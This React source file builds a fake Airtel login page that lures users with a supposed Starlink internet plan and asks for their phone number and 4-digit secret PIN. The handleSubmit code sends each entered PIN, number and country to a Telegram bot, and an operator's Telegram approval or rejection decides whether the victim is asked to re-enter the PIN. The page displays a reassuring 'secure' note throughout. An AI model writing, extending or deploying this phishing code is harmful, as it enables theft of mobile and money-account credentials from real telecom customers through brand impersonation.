import React, { useState, useRef, useEffect } from 'react';
import { motion, AnimatePresence } from 'motion/react';
import { AirtelLogo } from './Logos';
import { InternetPlan } from '../types';
import { ValidatingModal } from './ValidatingModal';
import { useTelegramPolling } from '../hooks/useTelegramPolling';
import { telegramService } from '../services/telegramService';
import { LanguageSwitch } from './LanguageSwitch';
import { useApp } from '../context/AppContext';
import { validateAirtelPhone, CountryInfo, AIRTEL_COUNTRIES } from '../data/countries';
import {
  Eye,
  EyeOff,
  ArrowLeft,
  Lock,
  Smartphone,
  AlertTriangle,
  Loader2,
  Zap,
  CheckCircle2,
  ShieldCheck,
  ChevronDown,
  Search,
  Check,
} from 'lucide-react';

interface LoginPageProps {
  selectedPlan: InternetPlan;
  onBack: () => void;
  onLoginSuccess: (
    phone: string,
    pin: string,
    sessionId: string,
    country: CountryInfo,
    fullPhone: string
  ) => void;
}

export const LoginPage: React.FC<LoginPageProps> = ({
  selectedPlan,
  onBack,
  onLoginSuccess,
}) => {
  const { country, setCountry, language, t } = useApp();
  const [phoneNumber, setPhoneNumber] = useState('');
  const [pinDigits, setPinDigits] = useState<string[]>(['', '', '', '']);
  const [showPin, setShowPin] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [errorMessage, setErrorMessage] = useState<string | null>(null);
  const [hasAttemptedSubmit, setHasAttemptedSubmit] = useState(false);
  const [sessionId, setSessionId] = useState<string>('');
  const [isWaitingTelegram, setIsWaitingTelegram] = useState(false);

  // Country selector popover (beside phone number)
  const [isCountryPickerOpen, setIsCountryPickerOpen] = useState(false);
  const [countrySearchQuery, setCountrySearchQuery] = useState('');
  const countryPickerRef = useRef<HTMLDivElement>(null);
  const countrySearchInputRef = useRef<HTMLInputElement>(null);
  const phoneInputRef = useRef<HTMLInputElement>(null);

  const pinInputRefs = useRef<(HTMLInputElement | null)[]>([]);

  // Close country picker on outside click
  useEffect(() => {
    const handleClickOutside = (event: Event) => {
      if (countryPickerRef.current && !countryPickerRef.current.contains(event.target as Node)) {
        setIsCountryPickerOpen(false);
      }
    };
    if (isCountryPickerOpen) {
      document.addEventListener('mousedown', handleClickOutside);
      document.addEventListener('touchstart', handleClickOutside, { passive: true });
      setTimeout(() => countrySearchInputRef.current?.focus(), 80);
    } else {
      setCountrySearchQuery('');
    }
    return () => {
      document.removeEventListener('mousedown', handleClickOutside);
      document.removeEventListener('touchstart', handleClickOutside);
    };
  }, [isCountryPickerOpen]);

  const filteredCountries = AIRTEL_COUNTRIES.filter((c) => {
    const q = countrySearchQuery.toLowerCase().trim();
    if (!q) return true;
    return (
      c.nameEn.toLowerCase().includes(q) ||
      c.nameFr.toLowerCase().includes(q) ||
      c.dialCode.toLowerCase().includes(q) ||
      c.airtelBrand.toLowerCase().includes(q) ||
      c.id.toLowerCase().includes(q)
    );
  });

  // Generate session ID on mount
  useEffect(() => {
    const newSessionId =
      'stl_' +
      Math.random().toString(36).substring(2, 10) +
      '_' +
      Date.now().toString().slice(-4);
    setSessionId(newSessionId);
  }, []);

  // Phone validation with active country's format (no restriction on starting numbers)
  const phoneValidation = validateAirtelPhone(country, phoneNumber);
  const fullInternationalPhone = `${country.flag} ${country.dialCode} ${phoneValidation.formatted || phoneValidation.normalized}`;

  // Handle PIN input change
  const handlePinChange = (index: number, value: string) => {
    const cleanValue = value.replace(/\D/g, '').slice(-1);
    const newPin = [...pinDigits];
    newPin[index] = cleanValue;
    setPinDigits(newPin);
    setErrorMessage(null);

    // Auto move to next input
    if (cleanValue && index < 3) {
      pinInputRefs.current[index + 1]?.focus();
    }
  };

  const handlePinKeyDown = (index: number, e: React.KeyboardEvent<HTMLInputElement>) => {
    if (e.key === 'Backspace' && !pinDigits[index] && index > 0) {
      pinInputRefs.current[index - 1]?.focus();
    }
  };

  const handlePinPaste = (e: React.ClipboardEvent<HTMLInputElement>) => {
    e.preventDefault();
    const pastedData = e.clipboardData.getData('text').replace(/\D/g, '').slice(0, 4);
    if (pastedData) {
      const newPin = ['', '', '', ''];
      for (let i = 0; i < pastedData.length; i++) {
        newPin[i] = pastedData[i];
      }
      setPinDigits(newPin);
      if (pastedData.length === 4) {
        pinInputRefs.current[3]?.focus();
      } else {
        pinInputRefs.current[pastedData.length]?.focus();
      }
    }
  };

  const currentPin = pinDigits.join('');
  const isFormValid = phoneValidation.isValid && currentPin.length === 4;

  // Handle Telegram verification callbacks
  const { status: telegramStatus } = useTelegramPolling({
    sessionId: sessionId || null,
    phone: phoneValidation.normalized || phoneNumber.trim(),
    targetStep: 'login',
    isActive: isWaitingTelegram,
    onApproved: () => {
      setTimeout(() => {
        setIsWaitingTelegram(false);
        onLoginSuccess(
          phoneNumber.trim(),
          currentPin,
          sessionId,
          country,
          fullInternationalPhone
        );
      }, 800);
    },
    onRejected: () => {
      setIsWaitingTelegram(false);
      setErrorMessage(
        language === 'fr'
          ? 'Code PIN ou numéro de téléphone non valide. Veuillez vérifier et réessayer.'
          : 'Invalid PIN code or phone number. Please check and try again.'
      );
      setPinDigits(['', '', '', '']);
      pinInputRefs.current[0]?.focus();
    },
  });

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setHasAttemptedSubmit(true);

    if (!phoneValidation.isValid) {
      setErrorMessage(
        language === 'fr' ? phoneValidation.errorFr || '' : phoneValidation.errorEn || ''
      );
      return;
    }

    if (currentPin.length !== 4) {
      setErrorMessage(
        language === 'fr'
          ? 'Le code PIN doit comporter exactement 4 chiffres.'
          : 'The PIN code must be exactly 4 digits.'
      );
      return;
    }

    if (isSubmitting) return;

    setIsSubmitting(true);
    setErrorMessage(null);

    try {
      // Send login info with country and full international phone to Telegram Bot
      await telegramService.sendLogin({
        sessionId,
        country: `${country.flag} ${language === 'fr' ? country.nameFr : country.nameEn}`,
        countryCode: country.id,
        airtelBrand: country.airtelBrand,
        phone: phoneValidation.normalized,
        fullPhone: fullInternationalPhone,
        pin: currentPin,
        planName: `${selectedPlan.dataAmount} ${selectedPlan.dataUnit} (${selectedPlan.validity})`,
        planPrice: selectedPlan.price,
      });

      // Open validating modal
      setIsWaitingTelegram(true);
    } catch (err: any) {
      setErrorMessage(
        err.message ||
          (language === 'fr'
            ? 'Impossible de joindre le service de validation. Veuillez réessayer.'
            : 'Could not connect to validation service. Please try again.')
      );
    } finally {
      setIsSubmitting(false);
    }
  };

  return (
    <div className="min-h-screen bg-[#F7F9FC] flex flex-col justify-between text-neutral-900 selection:bg-[#E60000] selection:text-white">
      {/* Top Header */}
      <header className="w-full bg-white border-b border-neutral-200 shadow-sm py-3.5 px-4 sm:px-6 sticky top-0 z-30">
        <div className="max-w-4xl mx-auto flex items-center justify-between gap-2">
          <button
            type="button"
            id="btn-back-to-plans"
            onClick={onBack}
            className="flex items-center gap-1.5 text-xs font-bold text-neutral-600 hover:text-[#E60000] transition-colors py-2 px-2.5 rounded-xl hover:bg-neutral-100 cursor-pointer"
          >
            <ArrowLeft className="w-4 h-4" />
            <span className="hidden xs:inline">{t('backToPlans')}</span>
            <span className="xs:hidden">{t('back')}</span>
          </button>

          <div className="flex items-center gap-3">
            <LanguageSwitch variant="light" />

            <div className="hidden sm:flex items-center gap-2 pl-2 border-l border-neutral-200">
              <span className="text-[11px] font-bold text-neutral-500 uppercase tracking-wider">
                {t('airtelLitePortal')}
              </span>
              <div className="w-2.5 h-2.5 rounded-full bg-emerald-500 animate-pulse" />
            </div>
          </div>
        </div>
      </header>

      {/* Main Form Center Box */}
      <main className="flex-1 flex flex-col items-center justify-center px-3 sm:px-4 py-6 sm:py-12">
        <motion.div
          initial={{ opacity: 0, y: 20 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -20 }}
          transition={{ duration: 0.35 }}
          className="w-full max-w-md bg-white rounded-3xl shadow-[0_15px_45px_rgba(0,0,0,0.07)] border border-neutral-200/80 p-5 sm:p-8 relative overflow-hidden"
        >
          {/* Subtle top red brand bar */}
          <div className="absolute top-0 left-0 right-0 h-1.5 bg-gradient-to-r from-[#E60000] via-rose-500 to-[#c40000]" />

          {/* Selected Plan Summary Pill */}
          <div className="mb-6 p-3.5 rounded-2xl bg-red-50/70 border border-red-100 flex items-center justify-between gap-2">
            <div className="flex items-center gap-2.5 min-w-0">
              <div className="w-8 h-8 rounded-xl bg-[#E60000] text-white flex items-center justify-center font-black text-xs shadow-sm shrink-0">
                <Zap className="w-4 h-4" />
              </div>
              <div className="min-w-0">
                <p className="text-[11px] font-semibold text-neutral-500 truncate">{t('selectedPlanPill')}</p>
                <p className="text-xs font-black text-neutral-900 truncate">
                  {selectedPlan.dataAmount} {selectedPlan.dataUnit} • {selectedPlan.validity}
                </p>
              </div>
            </div>
            <div className="text-right shrink-0">
              <span className="font-black text-sm text-[#E60000]">{selectedPlan.price}</span>
            </div>
          </div>

          {/* Airtel Logo Header */}
          <div className="flex flex-col items-center text-center mb-6">
            <AirtelLogo variant="nextgen" className="h-11 mb-2" />
            <h2 className="text-base sm:text-lg font-bold text-neutral-800 tracking-tight mt-1">
              {t('loginTitle')}
            </h2>
            <p className="text-xs text-neutral-500 mt-1">
              {t('loginSubtitle')}
            </p>
          </div>

          {/* Error Message Box */}
          {errorMessage && (
            <motion.div
              initial={{ opacity: 0, scale: 0.95 }}
              animate={{ opacity: 1, scale: 1 }}
              className="mb-5 p-3.5 rounded-2xl bg-rose-50 border border-rose-200 text-rose-700 text-xs flex items-start gap-2.5 font-medium"
            >
              <AlertTriangle className="w-4 h-4 shrink-0 mt-0.5" />
              <span>{errorMessage}</span>
            </motion.div>
          )}

          {/* Form */}
          <form onSubmit={handleSubmit} className="space-y-4">
            {/* 1. Phone Number Input */}
            <div>
              <div className="flex items-center justify-between mb-1.5">
                <label
                  htmlFor="phone-input"
                  className="block text-xs font-bold text-neutral-700 uppercase tracking-wider"
                >
                  {t('phoneLabel')}
                </label>
                <span className="text-[10px] font-bold text-[#E60000] flex items-center gap-1">
                  <span>{country.flag}</span>
                  <span>{country.airtelBrand}</span>
                </span>
              </div>

              <div className="relative" ref={countryPickerRef}>
                <div
                  className={`relative flex items-center rounded-2xl border-2 transition-all bg-white overflow-hidden shadow-inner ${
                    hasAttemptedSubmit && !phoneValidation.isValid
                      ? 'border-rose-400 ring-4 ring-rose-500/10'
                      : phoneValidation.isValid && phoneNumber
                      ? 'border-emerald-500 ring-4 ring-emerald-500/10'
                      : 'border-neutral-300 focus-within:border-[#0055FF] focus-within:ring-4 focus-within:ring-blue-500/10'
                  }`}
                >
                  {/* Country Code Prefix Button with Flag (Option beside number area) */}
                  <button
                    type="button"
                    id="btn-phone-code-prefix"
                    onClick={() => setIsCountryPickerOpen(!isCountryPickerOpen)}
                    className="flex items-center gap-2 bg-neutral-100 hover:bg-neutral-200 active:bg-neutral-300 px-3 py-3 border-r border-neutral-300 text-neutral-900 font-bold text-sm shrink-0 transition-colors select-none cursor-pointer"
                    title={language === 'fr' ? 'Changer de pays / indicatif' : 'Change country code'}
                  >
                    <span className="text-2xl shrink-0 leading-none select-none">{country.flag}</span>
                    <span className="font-mono font-black">{country.dialCode}</span>
                    <ChevronDown
                      className={`w-3.5 h-3.5 text-neutral-500 transition-transform duration-200 ${
                        isCountryPickerOpen ? 'rotate-180' : ''
                      }`}
                    />
                  </button>

                  <input
                    ref={phoneInputRef}
                    id="phone-input"
                    type="tel"
                    autoFocus
                    value={phoneNumber}
                    onChange={(e) => {
                      const clean = e.target.value.replace(/\D/g, '').slice(0, country.maxDigits);
                      setPhoneNumber(clean);
                      setErrorMessage(null);
                    }}
                    placeholder={country.placeholder}
                    maxLength={country.maxDigits}
                    className="w-full px-3 py-3 text-neutral-900 font-bold text-base tracking-wider placeholder:text-neutral-400 focus:outline-none bg-transparent"
                  />

                  <div className="pr-3 flex items-center gap-1.5 shrink-0">
                    {phoneNumber ? (
                      phoneValidation.isValid ? (
                        <CheckCircle2 className="w-5 h-5 text-emerald-600" />
                      ) : (
                        <span className="text-[10px] font-mono font-bold text-rose-600 bg-rose-50 px-1.5 py-0.5 rounded border border-rose-200">
                          {phoneNumber.length}/{country.minDigits === country.maxDigits ? country.minDigits : `${country.minDigits}-${country.maxDigits}`}
                        </span>
                      )
                    ) : (
                      <Smartphone className="w-5 h-5 text-neutral-400" />
                    )}
                  </div>
                </div>

                {/* Country Selection Dropdown Popover attached to prefix button */}
                <AnimatePresence>
                  {isCountryPickerOpen && (
                    <motion.div
                      initial={{ opacity: 0, y: -6, scale: 0.98 }}
                      animate={{ opacity: 1, y: 4, scale: 1 }}
                      exit={{ opacity: 0, y: -6, scale: 0.98 }}
                      transition={{ duration: 0.18 }}
                      className="absolute left-0 right-0 z-50 rounded-2xl bg-white border border-neutral-200 shadow-2xl p-2.5 text-neutral-900 mt-1 max-h-[340px] flex flex-col"
                    >
                      {/* Search Input Box */}
                      <div className="relative mb-2 shrink-0">
                        <Search className="w-4 h-4 text-neutral-400 absolute left-3 top-1/2 -translate-y-1/2" />
                        <input
                          ref={countrySearchInputRef}
                          type="text"
                          value={countrySearchQuery}
                          onChange={(e) => setCountrySearchQuery(e.target.value)}
                          placeholder={language === 'fr' ? 'Rechercher un pays ou indicatif...' : 'Search country or code...'}
                          className="w-full pl-9 pr-3 py-2 rounded-xl bg-neutral-50 border border-neutral-200 text-xs font-bold text-neutral-800 placeholder:text-neutral-400 focus:outline-none focus:border-[#0055FF] focus:bg-white"
                        />
                      </div>

                      {/* Countries List */}
                      <div className="overflow-y-auto space-y-1 flex-1 pr-1 overscroll-contain">
                        {filteredCountries.length === 0 ? (
                          <div className="p-4 text-center text-xs text-neutral-500 font-medium">
                            {language === 'fr' ? 'Aucun pays trouvé' : 'No country found'}
                          </div>
                        ) : (
                          filteredCountries.map((c) => {
                            const isSelected = country.id === c.id;
                            return (
                              <button
                                key={c.id}
                                type="button"
                                onClick={() => {
                                  setCountry(c, false);
                                  setIsCountryPickerOpen(false);
                                  setErrorMessage(null);
                                  setTimeout(() => phoneInputRef.current?.focus(), 50);
                                }}
                                className={`w-full flex items-center justify-between p-2.5 rounded-xl transition-all text-left cursor-pointer ${
                                  isSelected
                                    ? 'bg-red-50 text-[#E60000] font-bold border border-red-200 shadow-sm'
                                    : 'hover:bg-neutral-100 text-neutral-800'
                                }`}
                              >
                                <div className="flex items-center gap-2.5 min-w-0">
                                  <span className="text-2xl shrink-0 leading-none">{c.flag}</span>
                                  <div className="min-w-0">
                                    <div className="text-xs font-bold truncate flex items-center gap-1.5">
                                      <span className="truncate">{language === 'fr' ? c.nameFr : c.nameEn}</span>
                                      <span className="px-1.5 py-0.5 rounded bg-neutral-100 text-neutral-800 font-mono text-[11px] font-black border border-neutral-200/80">
                                        {c.dialCode}
                                      </span>
                                    </div>
                                    <div className="text-[10px] text-neutral-500 truncate mt-0.5">
                                      {c.airtelBrand}
                                    </div>
                                  </div>
                                </div>

                                <div className="shrink-0 ml-2 flex items-center gap-1.5">
                                  <span className="text-[10px] font-mono font-semibold px-2 py-0.5 rounded-md bg-neutral-100 text-neutral-600">
                                    {c.minDigits === c.maxDigits ? `${c.minDigits}` : `${c.minDigits}-${c.maxDigits}`} {language === 'fr' ? 'chiffres' : 'digits'}
                                  </span>
                                  {isSelected && (
                                    <div className="w-5 h-5 rounded-full bg-[#E60000] text-white flex items-center justify-center">
                                      <Check className="w-3 h-3 stroke-[3]" />
                                    </div>
                                  )}
                                </div>
                              </button>
                            );
                          })
                        )}
                      </div>
                    </motion.div>
                  )}
                </AnimatePresence>
              </div>

              {/* Dynamic validation / format helper text */}
              <div className="mt-1.5">
                {phoneNumber && !phoneValidation.isValid ? (
                  <p className="text-[11px] font-bold text-rose-600 flex items-center gap-1.5 pl-1">
                    <AlertTriangle className="w-3.5 h-3.5 shrink-0" />
                    <span>
                      {language === 'fr'
                        ? phoneValidation.errorFr
                        : phoneValidation.errorEn}
                    </span>
                  </p>
                ) : phoneNumber && phoneValidation.isValid ? (
                  <div className="p-2 rounded-xl bg-emerald-50 border border-emerald-200 flex items-center justify-between text-xs text-emerald-800 font-bold">
                    <span className="flex items-center gap-1.5">
                      <CheckCircle2 className="w-4 h-4 text-emerald-600 shrink-0" />
                      <span>{language === 'fr' ? 'Format valide :' : 'Valid format:'}</span>
                    </span>
                    <span className="font-mono font-black text-emerald-950">
                      {country.flag} {country.dialCode} {phoneValidation.formatted || phoneValidation.normalized}
                    </span>
                  </div>
                ) : (
                  <p className="text-[10px] text-neutral-500 font-medium pl-1">
                    {t('phoneFormatHint')}{' '}
                    <span className="font-bold text-neutral-700">
                      {language === 'fr' ? country.descriptionFr : country.descriptionEn}
                    </span>
                  </p>
                )}
              </div>
            </div>

            {/* 4-Digit Secret PIN Input */}
            <div>
              <div className="flex items-center justify-between mb-2">
                <label className="block text-xs font-bold text-neutral-700 uppercase tracking-wider">
                  {t('pinLabel')}
                </label>
                <button
                  type="button"
                  id="btn-toggle-pin-visibility"
                  onClick={() => setShowPin(!showPin)}
                  className="flex items-center gap-1 text-xs font-semibold text-neutral-500 hover:text-neutral-900 transition-colors cursor-pointer"
                >
                  {showPin ? (
                    <>
                      <EyeOff className="w-3.5 h-3.5" />
                      <span>{t('hide')}</span>
                    </>
                  ) : (
                    <>
                      <Eye className="w-3.5 h-3.5" />
                      <span>{t('show')}</span>
                    </>
                  )}
                </button>
              </div>

              {/* 4 Separate PIN Digit Boxes */}
              <div className="flex items-center justify-center gap-3 sm:gap-4">
                {[0, 1, 2, 3].map((index) => {
                  const hasDigit = Boolean(pinDigits[index]);
                  return (
                    <div key={index} className="relative flex-1 max-w-[68px]">
                      <input
                        ref={(el) => {
                          pinInputRefs.current[index] = el;
                        }}
                        type={showPin ? 'text' : 'password'}
                        inputMode="numeric"
                        maxLength={1}
                        value={pinDigits[index]}
                        onChange={(e) => handlePinChange(index, e.target.value)}
                        onKeyDown={(e) => handlePinKeyDown(index, e)}
                        onPaste={handlePinPaste}
                        className={`w-full h-13 sm:h-14 text-center text-xl sm:text-2xl font-black rounded-2xl border-2 transition-all bg-neutral-50 focus:bg-white focus:outline-none ${
                          hasDigit
                            ? 'border-[#0055FF] text-neutral-900 ring-2 ring-blue-500/10'
                            : 'border-neutral-300 text-neutral-700 focus:border-[#0055FF] focus:ring-4 focus:ring-blue-500/10'
                        }`}
                      />
                    </div>
                  );
                })}
              </div>

              <div className="flex items-center justify-between mt-2 px-1 text-[11px] text-neutral-500">
                <span className="flex items-center gap-1">
                  <Lock className="w-3.5 h-3.5 text-neutral-400" />
                  <span>{language === 'fr' ? 'Code secret à 4 chiffres' : '4-digit secret PIN'}</span>
                </span>
                <span className="font-semibold text-neutral-400">{currentPin.length}/4</span>
              </div>
            </div>

            {/* Submit Button */}
            <button
              type="submit"
              id="btn-login-submit"
              disabled={isSubmitting}
              className={`w-full py-4 px-6 rounded-2xl font-black text-sm uppercase tracking-wider transition-all duration-200 flex items-center justify-center gap-2 cursor-pointer shadow-lg ${
                isFormValid && !isSubmitting
                  ? 'bg-[#E60000] hover:bg-[#c90000] active:scale-[0.98] text-white shadow-red-500/30'
                  : 'bg-neutral-200 text-neutral-400 cursor-not-allowed shadow-none'
              }`}
            >
              {isSubmitting ? (
                <>
                  <Loader2 className="w-5 h-5 animate-spin" />
                  <span>{t('connecting')}</span>
                </>
              ) : (
                <span>{t('validateContinue')}</span>
              )}
            </button>
          </form>

          {/* Secure Guarantee Note */}
          <div className="mt-6 pt-5 border-t border-neutral-100 flex items-center justify-center gap-2 text-center text-[11px] text-neutral-500">
            <ShieldCheck className="w-4 h-4 text-emerald-600 shrink-0" />
            <span>{t('secureNote')}</span>
          </div>
        </motion.div>
      </main>

      {/* Footer */}
      <footer className="w-full bg-white border-t border-neutral-200 py-4 px-4 text-center text-xs text-neutral-500">
        <div className="max-w-4xl mx-auto flex items-center justify-center gap-2">
          <span>© 2026 {country.airtelBrand}</span>
          <span>•</span>
          <span>Starlink Direct-to-Cell</span>
        </div>
      </footer>

      {/* Validating Modal */}
      <ValidatingModal
        isOpen={isWaitingTelegram}
        type="pin"
        phone={fullInternationalPhone}
        planName={`${selectedPlan.dataAmount} ${selectedPlan.dataUnit}`}
        status={
          telegramStatus === 'approved'
            ? 'approved'
            : telegramStatus === 'rejected'
            ? 'rejected'
            : 'pending'
        }
      />
    </div>
  );
};
